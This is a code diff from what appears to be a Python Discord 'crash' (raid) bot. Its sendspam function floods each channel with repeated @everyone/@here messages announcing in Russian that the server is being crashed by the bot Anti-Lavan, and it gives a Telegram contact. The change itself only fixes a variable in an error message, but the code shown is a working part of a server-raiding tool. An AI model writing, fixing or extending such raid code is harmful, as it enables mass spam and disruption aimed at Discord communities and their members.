@@ -137,7 +137,7 @@ async def sendspam(channel):
             for _ in range(5):
                 await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
         except:
-            print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {ctx.guild.name} в канал #{channel.name}')
+            print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {channel.guild.name} в канал #{channel.name}')
 
 
 @client.command()
